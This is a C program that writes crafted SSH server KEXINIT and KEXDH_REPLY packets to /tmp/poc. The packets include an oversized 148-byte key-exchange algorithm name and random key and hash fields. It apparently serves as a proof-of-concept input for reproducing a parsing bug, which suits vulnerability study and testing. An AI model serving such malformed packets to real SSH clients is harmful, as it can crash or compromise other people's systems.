#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    unsigned char packet[2048];
    int pos = 0;

    /* ===== Server KEXINIT Packet ===== */
    int kexinit_start = pos;

    /* Packet length placeholder */
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;

    /* Padding length placeholder */
    int kex_pad_len_pos = pos;
    packet[pos++] = 0;

    /* Packet type: SSH_MSG_KEXINIT = 20 */
    packet[pos++] = 20;

    /* Cookie (16 random bytes) */
    for (int i = 0; i < 16; i++) {
        packet[pos++] = (unsigned char)(rand() & 0xff);
    }

    /* kex_algorithms: name-list with a single 148-byte algorithm name */
    unsigned int len = 148;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    for (unsigned int i = 0; i < len; i++) {
        packet[pos++] = 'a';
    }

    /* server_host_key_algorithms */
    len = 7;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "ssh-rsa", 7);
    pos += 7;

    /* encryption_algorithms_ctos */
    len = 10;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "aes128-ctr", 10);
    pos += 10;

    /* encryption_algorithms_stoc */
    len = 10;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "aes128-ctr", 10);
    pos += 10;

    /* mac_algorithms_ctos */
    len = 9;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "hmac-sha1", 9);
    pos += 9;

    /* mac_algorithms_stoc */
    len = 9;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "hmac-sha1", 9);
    pos += 9;

    /* compression_algorithms_ctos */
    len = 4;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "none", 4);
    pos += 4;

    /* compression_algorithms_stoc */
    len = 4;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "none", 4);
    pos += 4;

    /* languages_ctos */
    len = 0;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;

    /* languages_stoc */
    len = 0;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;

    /* first_kex_packet_follows */
    packet[pos++] = 0;

    /* reserved */
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;

    /* Add padding to KEXINIT */
    int kex_start_pad = pos;
    while ((pos % 8) != 0) {
        packet[pos++] = 0;
    }
    int kex_pad_len = pos - kex_start_pad;
    packet[kex_pad_len_pos] = kex_pad_len;

    /* Set KEXINIT packet length */
    unsigned int kex_pkt_len = pos - kexinit_start - 4;
    packet[kexinit_start] = (kex_pkt_len >> 24) & 0xff;
    packet[kexinit_start + 1] = (kex_pkt_len >> 16) & 0xff;
    packet[kexinit_start + 2] = (kex_pkt_len >> 8) & 0xff;
    packet[kexinit_start + 3] = kex_pkt_len & 0xff;

    /* ===== Server KEXDH_REPLY Packet ===== */
    int dh_start = pos;

    /* Packet length placeholder */
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;

    /* Padding length placeholder */
    int dh_pad_len_pos = pos;
    packet[pos++] = 0;

    /* Packet type: SSH_MSG_KEXDH_REPLY = 31 */
    packet[pos++] = 31;

    /* Host key blob: a valid ssh-rsa public key */
    int hostkey_data_start = pos;
    int hostkey_len_pos = pos;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;
    packet[pos++] = 0;

    /* Algorithm name: ssh-rsa */
    len = 7;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    memcpy(packet + pos, "ssh-rsa", 7);
    pos += 7;

    /* e (RSA public exponent) as mpint */
    len = 1;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    packet[pos++] = 35;

    /* n (RSA modulus) as mpint */
    len = 128;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    for (int i = 0; i < 128; i++) {
        packet[pos++] = (unsigned char)(rand() & 0xff);
    }

    /* Set host key string length */
    unsigned int hostkey_data_len = pos - hostkey_data_start;
    packet[hostkey_len_pos] = (hostkey_data_len >> 24) & 0xff;
    packet[hostkey_len_pos + 1] = (hostkey_data_len >> 16) & 0xff;
    packet[hostkey_len_pos + 2] = (hostkey_data_len >> 8) & 0xff;
    packet[hostkey_len_pos + 3] = hostkey_data_len & 0xff;

    /* f (server's DH public key) as mpint */
    len = 1;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    packet[pos++] = 5;

    /* H (exchange hash) as string */
    len = 20;
    packet[pos++] = (len >> 24) & 0xff;
    packet[pos++] = (len >> 16) & 0xff;
    packet[pos++] = (len >> 8) & 0xff;
    packet[pos++] = len & 0xff;
    for (int i = 0; i < 20; i++) {
        packet[pos++] = (unsigned char)(rand() & 0xff);
    }

    /* Add padding to DH reply */
    int dh_start_pad = pos;
    while ((pos % 8) != 0) {
        packet[pos++] = 0;
    }
    int dh_pad_len = pos - dh_start_pad;
    packet[dh_pad_len_pos] = dh_pad_len;

    /* Set DH reply packet length */
    unsigned int dh_pkt_len = pos - dh_start - 4;
    packet[dh_start] = (dh_pkt_len >> 24) & 0xff;
    packet[dh_start + 1] = (dh_pkt_len >> 16) & 0xff;
    packet[dh_start + 2] = (dh_pkt_len >> 8) & 0xff;
    packet[dh_start + 3] = dh_pkt_len & 0xff;

    fwrite(packet, 1, pos, f);
    fclose(f);
    return 0;
}